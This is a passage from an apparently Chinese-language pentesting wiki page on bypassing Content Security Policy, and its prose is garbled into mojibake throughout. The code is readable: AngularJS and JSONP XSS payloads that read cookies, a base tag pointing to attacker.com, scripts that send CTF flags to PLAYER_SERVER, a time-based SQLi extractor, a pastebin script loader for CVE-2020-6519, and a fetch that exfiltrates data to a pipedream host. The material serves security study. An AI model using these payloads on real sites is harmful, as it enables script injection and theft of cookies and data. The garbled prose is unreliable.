è¿™æ˜¯å› ä¸ºå¯¹äºæµè§ˆå™¨æ¥è¯´ï¼Œä½ æ­£åœ¨åŠ è½½ä¸€ä¸ªåä¸º `..%2fangular%2fangular.js` çš„æ–‡ä»¶ï¼Œå®ƒä½äº `https://example.com/scripts/react/` ä¸‹ï¼Œè¿™ç¬¦åˆCSPã€‚

ç„¶è€Œï¼Œå¯¹äºæŸäº›æœåŠ¡å™¨ï¼Œåœ¨æ¥æ”¶åˆ°è¯·æ±‚æ—¶ï¼Œå®ƒä»¬ä¼šå¯¹å…¶è¿›è¡Œè§£ç ï¼Œå®é™…ä¸Šè¯·æ±‚çš„æ˜¯ `https://example.com/scripts/react/../angular/angular.js`ï¼Œè¿™ç­‰åŒäº `https://example.com/scripts/angular/angular.js`ã€‚

é€šè¿‡**åˆ©ç”¨æµè§ˆå™¨å’ŒæœåŠ¡å™¨ä¹‹é—´å¯¹URLè§£é‡Šçš„ä¸ä¸€è‡´æ€§ï¼Œå¯ä»¥ç»•è¿‡è·¯å¾„è§„åˆ™**ã€‚

è§£å†³æ–¹æ¡ˆæ˜¯åœ¨æœåŠ¡å™¨ç«¯ä¸å°† `%2f` è§†ä¸º `/`ï¼Œç¡®ä¿æµè§ˆå™¨å’ŒæœåŠ¡å™¨ä¹‹é—´çš„è§£é‡Šä¸€è‡´ï¼Œä»¥é¿å…è¿™ä¸ªé—®é¢˜ã€‚

åœ¨çº¿ç¤ºä¾‹ï¼š[ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### Iframes JS æ‰§è¡Œ

{% content-ref url="../xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](../xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### ç¼ºå°‘ **base-uri**

å¦‚æœç¼ºå°‘ **base-uri** æŒ‡ä»¤ï¼Œä½ å¯ä»¥åˆ©ç”¨å®ƒæ¥æ‰§è¡Œ[**æ‚¬æŒ‚æ ‡è®°æ³¨å…¥**](../dangling-markup-html-scriptless-injection/)ã€‚

æ­¤å¤–ï¼Œå¦‚æœ**é¡µé¢ä½¿ç”¨ç›¸å¯¹è·¯å¾„åŠ è½½è„šæœ¬**ï¼ˆå¦‚ `<script src="/js/app.js">`ï¼‰å¹¶ä½¿ç”¨**Nonce**ï¼Œä½ å¯ä»¥åˆ©ç”¨ **base** **æ ‡ç­¾**ä½¿å…¶**ä»ä½ è‡ªå·±çš„æœåŠ¡å™¨åŠ è½½**è„šæœ¬ï¼Œä»è€Œå®ç°XSSã€‚\
å¦‚æœæ˜“å—æ”»å‡»çš„é¡µé¢æ˜¯é€šè¿‡ **httpS** åŠ è½½çš„ï¼Œè¯·åœ¨baseä¸­ä½¿ç”¨httpS urlã€‚
```html
<base href="https://www.attacker.com/">
```
### AngularJS äº‹ä»¶

å–å†³äºå…·ä½“çš„ç­–ç•¥ï¼ŒCSP å°†é˜»æ­¢ JavaScript äº‹ä»¶ã€‚ç„¶è€Œï¼ŒAngularJS å®šä¹‰äº†å®ƒè‡ªå·±çš„äº‹ä»¶ï¼Œå¯ä»¥ä»£æ›¿ä½¿ç”¨ã€‚å½“åœ¨äº‹ä»¶å†…éƒ¨æ—¶ï¼ŒAngularJS å®šä¹‰äº†ä¸€ä¸ªç‰¹æ®Šçš„ `$event` å¯¹è±¡ï¼Œå®ƒç®€å•åœ°å¼•ç”¨æµè§ˆå™¨äº‹ä»¶å¯¹è±¡ã€‚æ‚¨å¯ä»¥ä½¿ç”¨è¿™ä¸ªå¯¹è±¡æ¥æ‰§è¡Œ CSP ç»•è¿‡ã€‚åœ¨ Chrome ä¸Šï¼Œ`$event/event` å¯¹è±¡ä¸Šæœ‰ä¸€ä¸ªç‰¹æ®Šå±æ€§å«åš `path`ã€‚è¿™ä¸ªå±æ€§åŒ…å«äº†ä¸€ä¸ªå¯¹è±¡æ•°ç»„ï¼Œè¿™äº›å¯¹è±¡å¯¼è‡´äº‹ä»¶è¢«æ‰§è¡Œã€‚æœ€åä¸€ä¸ªå±æ€§æ€»æ˜¯ `window` å¯¹è±¡ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å®ƒæ¥æ‰§è¡Œæ²™ç®±é€ƒé€¸ã€‚é€šè¿‡å°†è¿™ä¸ªæ•°ç»„ä¼ é€’ç»™ `orderBy` è¿‡æ»¤å™¨ï¼Œæˆ‘ä»¬å¯ä»¥æšä¸¾æ•°ç»„å¹¶ä½¿ç”¨æœ€åä¸€ä¸ªå…ƒç´ ï¼ˆ`window` å¯¹è±¡ï¼‰æ¥æ‰§è¡Œå…¨å±€å‡½æ•°ï¼Œä¾‹å¦‚ `alert()`ã€‚ä»¥ä¸‹ä»£ç æ¼”ç¤ºäº†è¿™ä¸€ç‚¹ï¼š
```markup
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
**åœ¨** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) **ä¸­æŸ¥æ‰¾å…¶ä»– Angular ç»•è¿‡æ–¹æ³•**

### AngularJS å’Œç™½åå•åŸŸ
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
å¦‚æœåº”ç”¨ç¨‹åºä½¿ç”¨çš„æ˜¯angular JSï¼Œå¹¶ä¸”è„šæœ¬æ˜¯ä»ç™½åå•åŸŸåŠ è½½çš„ã€‚å¯ä»¥é€šè¿‡è°ƒç”¨å›è°ƒå‡½æ•°å’Œæ˜“å—æ”»å‡»çš„ç±»æ¥ç»•è¿‡æ­¤CSPç­–ç•¥ã€‚æœ‰å…³æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·è®¿é—®è¿™ä¸ªå¾ˆæ£’çš„[git](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh\*t,-it's-CSP!%22)ä»“åº“ã€‚

æœ‰æ•ˆè½½è·ï¼š
```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
å…¶ä»– JSONP ä»»æ„æ‰§è¡Œç«¯ç‚¹å¯ä»¥åœ¨[**è¿™é‡Œ**](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt)æ‰¾åˆ°ï¼ˆå…¶ä¸­ä¸€äº›å·²è¢«åˆ é™¤æˆ–ä¿®å¤ï¼‰

### é€šè¿‡é‡å®šå‘ç»•è¿‡

å½“ CSP é‡åˆ°æœåŠ¡å™¨ç«¯é‡å®šå‘æ—¶ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿå¦‚æœé‡å®šå‘å¯¼è‡´äº†ä¸€ä¸ªä¸è¢«å…è®¸çš„ä¸åŒæºï¼Œå®ƒä»ç„¶ä¼šå¤±è´¥ã€‚

ç„¶è€Œï¼Œæ ¹æ® [CSP è§„èŒƒ 4.2.2.3. è·¯å¾„å’Œé‡å®šå‘](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects) ä¸­çš„æè¿°ï¼Œå¦‚æœé‡å®šå‘å¯¼è‡´äº†ä¸€ä¸ªä¸åŒçš„è·¯å¾„ï¼Œå®ƒå¯ä»¥ç»•è¿‡åŸå§‹é™åˆ¶ã€‚

è¿™é‡Œæœ‰ä¸€ä¸ªä¾‹å­ï¼š
```html
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Security-Policy" content="script-src http://localhost:5555 https://www.google.com/a/b/c/d">
</head>
<body>
<div id=userContent>
<script src="https://https://www.google.com/test"></script>
<script src="https://https://www.google.com/a/test"></script>
<script src="http://localhost:5555/301"></script>
</div>
</body>
</html>
```
å¦‚æœ CSP è®¾ç½®ä¸º `https://www.google.com/a/b/c/d`ï¼Œç”±äºè·¯å¾„è¢«è€ƒè™‘åœ¨å†…ï¼Œ`/test` å’Œ `/a/test` è„šæœ¬éƒ½å°†è¢« CSP é˜»æ­¢ã€‚

ç„¶è€Œï¼Œæœ€ç»ˆçš„ `http://localhost:5555/301` å°†ä¼š**åœ¨æœåŠ¡å™¨ç«¯é‡å®šå‘åˆ° `https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//`**ã€‚ç”±äºå®ƒæ˜¯ä¸€ä¸ªé‡å®šå‘ï¼Œ**è·¯å¾„ä¸è¢«è€ƒè™‘**ï¼Œå¹¶ä¸”**è„šæœ¬å¯ä»¥è¢«åŠ è½½**ï¼Œä»è€Œç»•è¿‡è·¯å¾„é™åˆ¶ã€‚

é€šè¿‡è¿™ç§é‡å®šå‘ï¼Œå³ä½¿è·¯å¾„è¢«å®Œå…¨æŒ‡å®šï¼Œå®ƒä»ç„¶å¯ä»¥è¢«ç»•è¿‡ã€‚

å› æ­¤ï¼Œæœ€ä½³è§£å†³æ–¹æ¡ˆæ˜¯ç¡®ä¿ç½‘ç«™æ²¡æœ‰ä»»ä½•å¼€æ”¾é‡å®šå‘æ¼æ´ï¼Œå¹¶ä¸” CSP è§„åˆ™ä¸­æ²¡æœ‰å¯ä»¥è¢«åˆ©ç”¨çš„åŸŸåã€‚

### é€šè¿‡æ‚¬æŒ‚æ ‡è®°ç»•è¿‡ CSP

é˜…è¯»[å¦‚ä½•åœ¨è¿™é‡Œ](../dangling-markup-html-scriptless-injection/)ã€‚

### 'unsafe-inline'; img-src \*; é€šè¿‡ XSS
```
default-src 'self' 'unsafe-inline'; img-src *;
```
```markdown
`'unsafe-inline'` è¡¨ç¤ºæ‚¨å¯ä»¥åœ¨ä»£ç ä¸­æ‰§è¡Œä»»ä½•è„šæœ¬ï¼ˆXSS å¯ä»¥æ‰§è¡Œä»£ç ï¼‰ï¼Œè€Œ `img-src *` è¡¨ç¤ºæ‚¨å¯ä»¥åœ¨ç½‘é¡µä¸Šä½¿ç”¨æ¥è‡ªä»»ä½•èµ„æºçš„ä»»ä½•å›¾ç‰‡ã€‚

æ‚¨å¯ä»¥é€šè¿‡é€šè¿‡å›¾ç‰‡æ³„éœ²æ•°æ®æ¥ç»•è¿‡æ­¤ CSPï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒXSS æ»¥ç”¨ CSRFï¼Œå…¶ä¸­æœºå™¨äººå¯ä»¥è®¿é—®çš„é¡µé¢åŒ…å« SQLiï¼Œå¹¶é€šè¿‡å›¾ç‰‡æå–æ ‡å¿—ï¼‰ï¼š
```
```javascript
<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new Image().src='http://PLAYER_SERVER/?'+_)</script>
```
```markdown
ä»ï¼š[https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

æ‚¨è¿˜å¯ä»¥æ»¥ç”¨æ­¤é…ç½®æ¥**åŠ è½½æ’å…¥åœ¨å›¾åƒä¸­çš„javascriptä»£ç **ã€‚ä¾‹å¦‚ï¼Œå¦‚æœé¡µé¢å…è®¸ä»TwitteråŠ è½½å›¾åƒã€‚æ‚¨å¯ä»¥**åˆ¶ä½œ**ä¸€ä¸ª**ç‰¹æ®Šå›¾åƒ**ï¼Œ**ä¸Šä¼ **åˆ°Twitterï¼Œå¹¶æ»¥ç”¨"**unsafe-inline**"æ¥**æ‰§è¡Œ**JSä»£ç ï¼ˆä½œä¸ºå¸¸è§„XSSï¼‰ï¼Œè¯¥ä»£ç å°†**åŠ è½½**å›¾åƒï¼Œ**æå–**å›¾åƒä¸­çš„**JS**å¹¶**æ‰§è¡Œ**å®ƒï¼š[https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### ä½¿ç”¨Service Workers

Service workersçš„**`importScripts`**å‡½æ•°ä¸å—CSPé™åˆ¶ï¼š

{% content-ref url="../xss-cross-site-scripting/abusing-service-workers.md" %}
[abusing-service-workers.md](../xss-cross-site-scripting/abusing-service-workers.md)
{% endcontent-ref %}

### ç­–ç•¥æ³¨å…¥

**ç ”ç©¶ï¼š**[**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

å¦‚æœæ‚¨å‘é€çš„**å‚æ•°**è¢«**ç²˜è´´åœ¨**ç­–ç•¥çš„**å£°æ˜**ä¸­ï¼Œé‚£ä¹ˆæ‚¨å¯ä»¥ä»¥æŸç§æ–¹å¼**æ”¹å˜**ç­–ç•¥ï¼Œä½¿å…¶å˜å¾—**æ— æ•ˆ**ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä»»ä½•ä¸€ç§æ–¹æ³•æ¥**å…è®¸è„šæœ¬ 'unsafe-inline'**ï¼š
```
```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
å› ä¸ºè¿™ä¸ªæŒ‡ä»¤ä¼š**è¦†ç›–ç°æœ‰çš„ script-src æŒ‡ä»¤**ã€‚
ä½ å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°ä¸€ä¸ªä¾‹å­ï¼š[http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

åœ¨ Edge ä¸­æ›´ç®€å•ã€‚å¦‚æœä½ èƒ½åœ¨ CSP ä¸­æ·»åŠ è¿™ä¸ªï¼š**`;_`**ï¼Œ**Edge** ä¼š**ä¸¢å¼ƒ**æ•´ä¸ª**ç­–ç•¥**ã€‚
ç¤ºä¾‹ï¼š[http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;_&y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;_&y=%3Cscript%3Ealert\(1\)%3C/script%3E)

### img-src \*; é€šè¿‡ XSS (iframe) - æ—¶é—´æ”»å‡»

æ³¨æ„ç¼ºå°‘æŒ‡ä»¤ `'unsafe-inline'`ã€‚
è¿™æ¬¡ä½ å¯ä»¥é€šè¿‡ **XSS** è®©å—å®³è€…**åŠ è½½**ä¸€ä¸ªåœ¨**ä½ æ§åˆ¶ä¸‹**çš„é¡µé¢ï¼Œä½¿ç”¨ `<iframe`ã€‚è¿™æ¬¡ä½ è¦è®©å—å®³è€…è®¿é—®ä½ æƒ³è¦æå–ä¿¡æ¯çš„é¡µé¢ï¼ˆ**CSRF**ï¼‰ã€‚ä½ æ— æ³•è®¿é—®é¡µé¢çš„å†…å®¹ï¼Œä½†å¦‚æœä½ èƒ½å¤Ÿ**æ§åˆ¶é¡µé¢åŠ è½½æ‰€éœ€çš„æ—¶é—´**ï¼Œä½ å°±å¯ä»¥æå–ä½ éœ€è¦çš„ä¿¡æ¯ã€‚

è¿™æ¬¡è¦æå–çš„æ˜¯ä¸€ä¸ª**æ ‡å¿—**ï¼Œæ¯å½“é€šè¿‡ SQLi æ­£ç¡®çŒœæµ‹ä¸€ä¸ª**å­—ç¬¦**æ—¶ï¼Œ**å“åº”**ä¼šå› ä¸º sleep å‡½æ•°è€Œ**èŠ±è´¹æ›´å¤šæ—¶é—´**ã€‚ç„¶åï¼Œä½ å°†èƒ½å¤Ÿæå–æ ‡å¿—ï¼š
```javascript
<iframe name=f id=g></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org";
function gen(x) {
x = escape(x.replace(/_/g, '\\_'));
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`;
}

function gen2(x) {
x = escape(x);
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`;
}

async function query(word, end=false) {
let h = performance.now();
f.location = (end ? gen2(word) : gen(word));
await new Promise(r => {
g.onload = r;
});
let diff = performance.now() - h;
return diff > 300;
}

let alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789'.split('');
let postfix = '}'

async function run() {
let prefix = 'nn9ed{';
while (true) {
let i = 0;
for (i;i<alphabet.length;i++) {
let c = alphabet[i];
let t =  await query(prefix+c); // Check what chars returns TRUE or FALSE
console.log(prefix, c, t);
if (t) {
console.log('FOUND!')
prefix += c;
break;
}
}
if (i==alphabet.length) {
console.log('missing chars');
break;
}
let t = await query(prefix+'}', true);
if (t) {
prefix += '}';
break;
}
}
new Image().src = 'http://PLAYER_SERVER/?' + prefix; //Exfiltrate the flag
console.log(prefix);
}

run();
</script>
```
### é€šè¿‡ä¹¦ç­¾å°ç¨‹åº

è¿™ç§æ”»å‡»éœ€è¦ä¸€äº›ç¤¾ä¼šå·¥ç¨‹å­¦æŠ€å·§ï¼Œæ”»å‡»è€…éœ€è¦**è¯´æœç”¨æˆ·å°†é“¾æ¥æ‹–æ”¾åˆ°æµè§ˆå™¨çš„ä¹¦ç­¾å°ç¨‹åºä¸Š**ã€‚è¿™ä¸ªä¹¦ç­¾å°ç¨‹åºå°†åŒ…å«**æ¶æ„çš„JavaScriptä»£ç **ï¼Œå½“è¢«æ‹–æ”¾æˆ–ç‚¹å‡»æ—¶ï¼Œå®ƒä¼šåœ¨å½“å‰ç½‘é¡µçª—å£çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œ**ç»•è¿‡CSPå¹¶å…è®¸çªƒå–æ•æ„Ÿä¿¡æ¯**ï¼Œå¦‚cookiesæˆ–tokensã€‚

æ›´å¤šä¿¡æ¯è¯·[**æŸ¥çœ‹åŸå§‹æŠ¥å‘Š**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/)ã€‚

### é€šè¿‡é™åˆ¶CSPæ¥ç»•è¿‡CSP

åœ¨[**è¿™ä¸ªCTFå†™up**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution)ä¸­ï¼Œé€šè¿‡åœ¨å…è®¸çš„iframeä¸­æ³¨å…¥ä¸€ä¸ªæ›´åŠ ä¸¥æ ¼çš„CSPæ¥ç»•è¿‡CSPï¼Œè¿™ä¸ªæ›´åŠ ä¸¥æ ¼çš„CSPç¦æ­¢åŠ è½½ä¸€ä¸ªç‰¹å®šçš„JSæ–‡ä»¶ï¼Œç„¶åï¼Œé€šè¿‡**åŸå‹æ±¡æŸ“**æˆ–**DOMç¯¡æ”¹**å…è®¸**æ»¥ç”¨ä¸åŒçš„è„šæœ¬æ¥åŠ è½½ä»»æ„è„šæœ¬**ã€‚

ä½ å¯ä»¥ä½¿ç”¨**`csp`**å±æ€§æ¥**é™åˆ¶ä¸€ä¸ªIframeçš„CSP**ï¼š

{% code overflow="wrap" %}
```html
<iframe src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]" csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
{% endcode %}

åœ¨[**æ­¤CTFå†™up**](https://github.com/aszx87410/ctf-writeups/issues/48)ä¸­ï¼Œé€šè¿‡**HTMLæ³¨å…¥**å¯ä»¥è¿›ä¸€æ­¥**é™åˆ¶**ä¸€ä¸ª**CSP**ï¼Œä»è€Œç¦ç”¨äº†é˜²æ­¢CSTIçš„è„šæœ¬ï¼Œå› æ­¤**æ¼æ´å˜å¾—å¯åˆ©ç”¨ã€‚**\
CSPå¯ä»¥é€šè¿‡ä½¿ç”¨**HTML metaæ ‡ç­¾**æ¥æ›´åŠ ä¸¥æ ¼åœ°åˆ¶å®šï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡**ç§»é™¤**å…è®¸å…¶**nonce**çš„**æ¡ç›®**ï¼Œ**å¯ç”¨ç‰¹å®šçš„å†…è”è„šæœ¬é€šè¿‡sha**ï¼š
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';">
```
### ä½¿ç”¨ Content-Security-Policy-Report-Only çš„ JS æ•°æ®æ³„éœ²

å¦‚æœä½ èƒ½å¤Ÿè®©æœåŠ¡å™¨å“åº”å¸¦æœ‰ **`Content-Security-Policy-Report-Only`** å¤´ï¼Œå¹¶ä¸” **ç”±ä½ æ§åˆ¶çš„å€¼**ï¼ˆå¯èƒ½æ˜¯å› ä¸º CRLFï¼‰ï¼Œä½ å¯ä»¥è®©å®ƒæŒ‡å‘ä½ çš„æœåŠ¡å™¨ï¼Œå¦‚æœä½ ç”¨ **`<script>`** åŒ…è£¹ä½ æƒ³è¦æ³„éœ²çš„ **JS å†…å®¹**ï¼Œç”±äº CSP å¾ˆå¯èƒ½ä¸å…è®¸ `unsafe-inline`ï¼Œè¿™å°† **è§¦å‘ä¸€ä¸ª CSP é”™è¯¯**ï¼Œè„šæœ¬çš„ä¸€éƒ¨åˆ†ï¼ˆåŒ…å«æ•æ„Ÿä¿¡æ¯ï¼‰å°†ä¼šä» `Content-Security-Policy-Report-Only` å‘é€åˆ°æœåŠ¡å™¨ã€‚

ä¸¾ä¸ªä¾‹å­ï¼Œè¯·[**æŸ¥çœ‹è¿™ä¸ª CTF å†™up**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes)ã€‚

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector('DIV').innerHTML="<iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://pastebin.com/raw/dw5cWGK6\";document.body.appendChild(s);'></iframe>";
```
### æ³„éœ²ä¿¡æ¯ CSP + Iframe

æƒ³è±¡è¿™æ ·ä¸€ç§æƒ…å†µï¼šä¸€ä¸ª**é¡µé¢æ­£åœ¨é‡å®šå‘**åˆ°å¦ä¸€ä¸ªæ ¹æ®**ç”¨æˆ·**çš„ä¸åŒè€Œæœ‰ä¸åŒ**ç§˜å¯†çš„é¡µé¢**ã€‚ä¾‹å¦‚ï¼Œç”¨æˆ·**admin**è®¿é—®**redirectme.domain1.com**æ—¶ä¼šè¢«é‡å®šå‘åˆ°**adminsecret321.domain2.com**ï¼Œè€Œä½ å¯ä»¥å¯¹ç®¡ç†å‘˜è¿›è¡ŒXSSæ”»å‡»ã€‚\
**åŒæ ·ï¼Œè¢«é‡å®šå‘çš„é¡µé¢ä¸è¢«å®‰å…¨ç­–ç•¥å…è®¸ï¼Œä½†æ˜¯æ‰§è¡Œé‡å®šå‘çš„é¡µé¢æ˜¯å…è®¸çš„ã€‚**

ä½ å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼æ³„éœ²ç®¡ç†å‘˜è¢«é‡å®šå‘åˆ°çš„åŸŸåï¼š

* **é€šè¿‡CSPè¿è§„**
* **é€šè¿‡CSPè§„åˆ™ã€‚**

CSPè¿è§„æ˜¯å³æ—¶æ³„éœ²ã€‚æ‰€éœ€åšçš„å°±æ˜¯åŠ è½½ä¸€ä¸ªæŒ‡å‘`https://redirectme.domain1.com`çš„iframeï¼Œå¹¶ç›‘å¬åŒ…å«`blockedURI`å±æ€§çš„`securitypolicyviolation`äº‹ä»¶ï¼Œè¯¥å±æ€§åŒ…å«è¢«é˜»æ­¢URIçš„åŸŸåã€‚è¿™æ˜¯å› ä¸º`https://redirectme.domain1.com`ï¼ˆè¢«CSPå…è®¸ï¼‰é‡å®šå‘åˆ°`https://adminsecret321.domain2.com`ï¼ˆ**è¢«CSPé˜»æ­¢**ï¼‰ã€‚è¿™åˆ©ç”¨äº†å…³äºå¦‚ä½•å¤„ç†å¸¦æœ‰CSPçš„iframesçš„æœªå®šä¹‰è¡Œä¸ºã€‚Chromeå’ŒFirefoxåœ¨è¿™æ–¹é¢çš„è¡Œä¸ºä¸åŒã€‚

å½“ä½ çŸ¥é“å¯èƒ½ç»„æˆç§˜å¯†å­åŸŸåçš„å­—ç¬¦æ—¶ï¼Œä½ ä¹Ÿå¯ä»¥ä½¿ç”¨äºŒåˆ†æœç´¢ï¼Œå¹¶æ£€æŸ¥CSPä½•æ—¶é˜»æ­¢äº†èµ„æºï¼Œä½•æ—¶æ²¡æœ‰ï¼Œé€šè¿‡åœ¨CSPä¸­åˆ›å»ºä¸åŒçš„ç¦æ­¢åŸŸåï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œç§˜å¯†å¯ä»¥æ˜¯doc-X-XXXX.secdrivencontent.devçš„å½¢å¼ï¼‰
```
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
æŠ€å·§æ¥è‡ª[**è¿™é‡Œ**](https://ctftime.org/writeup/29310)ã€‚

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

åŠ å…¥[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)æœåŠ¡å™¨ï¼Œä¸ç»éªŒä¸°å¯Œçš„é»‘å®¢å’Œæ¼æ´èµé‡‘çŒäººäº¤æµï¼

**é»‘å®¢æ´å¯Ÿ**\
æ·±å…¥æ¢è®¨é»‘å®¢çš„åˆºæ¿€å’ŒæŒ‘æˆ˜

**å®æ—¶é»‘å®¢æ–°é—»**\
é€šè¿‡å®æ—¶æ–°é—»å’Œæ´å¯Ÿäº†è§£å¿«èŠ‚å¥çš„é»‘å®¢ä¸–ç•Œ

**æœ€æ–°å…¬å‘Š**\
åŠæ—¶äº†è§£æœ€æ–°å‘å¸ƒçš„æ¼æ´èµé‡‘å’Œå…³é”®å¹³å°æ›´æ–°

**åŠ å…¥æˆ‘ä»¬çš„** [**Discord**](https://discord.com/invite/N3FrSbmwdy) **ï¼Œä»Šå¤©å°±å¼€å§‹ä¸é¡¶å°–é»‘å®¢åˆä½œï¼**

## ç»•è¿‡CSPçš„ä¸å®‰å…¨æŠ€æœ¯

### PHPå“åº”ç¼“å†²åŒºæº¢å‡º

PHPä»¥**é»˜è®¤ç¼“å†²å“åº”è‡³4096**å­—èŠ‚è€Œé—»åã€‚å› æ­¤ï¼Œå¦‚æœPHPæ˜¾ç¤ºè­¦å‘Šï¼Œé€šè¿‡æä¾›**è¶³å¤Ÿçš„æ•°æ®åœ¨è­¦å‘Šä¸­**ï¼Œ**å“åº”**å°†ä¼š**åœ¨** **CSPå¤´éƒ¨ä¹‹å‰**è¢«**å‘é€**ï¼Œå¯¼è‡´å¤´éƒ¨è¢«å¿½ç•¥ã€‚\
ç„¶åï¼Œè¿™é¡¹æŠ€æœ¯åŸºæœ¬ä¸Šåœ¨äº**ç”¨è­¦å‘Šå¡«æ»¡å“åº”ç¼“å†²åŒº**ï¼Œä½¿å¾—CSPå¤´éƒ¨ä¸è¢«å‘é€ã€‚

çµæ„Ÿæ¥è‡ª[**è¿™ç¯‡writeup**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points)ã€‚

### é‡å†™é”™è¯¯é¡µé¢

ä»[**è¿™ç¯‡writeup**](https://blog.ssrf.kr/69)æ¥çœ‹ï¼Œé€šè¿‡åŠ è½½ä¸€ä¸ªå¯èƒ½æ²¡æœ‰CSPçš„é”™è¯¯é¡µé¢å¹¶é‡å†™å…¶å†…å®¹ï¼Œä¼¼ä¹å¯ä»¥ç»•è¿‡CSPä¿æŠ¤ã€‚
```javascript
a = window.open('/' + 'x'.repeat(4100));
setTimeout(function() {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`;
}, 1000);
```
### SOME + 'self' + wordpress

SOME æ˜¯ä¸€ç§æŠ€æœ¯ï¼Œå®ƒåˆ©ç”¨é¡µé¢ç«¯ç‚¹ä¸­çš„ XSSï¼ˆæˆ–é«˜åº¦é™åˆ¶çš„ XSSï¼‰**æ”»å‡»åŒæºçš„å…¶ä»–ç«¯ç‚¹**ã€‚è¿™æ˜¯é€šè¿‡ä»æ”»å‡»è€…é¡µé¢åŠ è½½æ˜“å—æ”»å‡»çš„ç«¯ç‚¹ï¼Œç„¶åå°†æ”»å‡»è€…é¡µé¢åˆ·æ–°åˆ°ä½ æƒ³è¦æ”»å‡»çš„åŒæºçš„çœŸå®ç«¯ç‚¹æ¥å®Œæˆçš„ã€‚è¿™æ ·ï¼Œ**æ˜“å—æ”»å‡»çš„ç«¯ç‚¹**å¯ä»¥ä½¿ç”¨**`opener`** å¯¹è±¡åœ¨**æœ‰æ•ˆè½½è·**ä¸­**è®¿é—®**è¦**æ”»å‡»çš„çœŸå®ç«¯ç‚¹çš„ DOM**ã€‚æ›´å¤šä¿¡æ¯è¯·æŸ¥çœ‹ï¼š

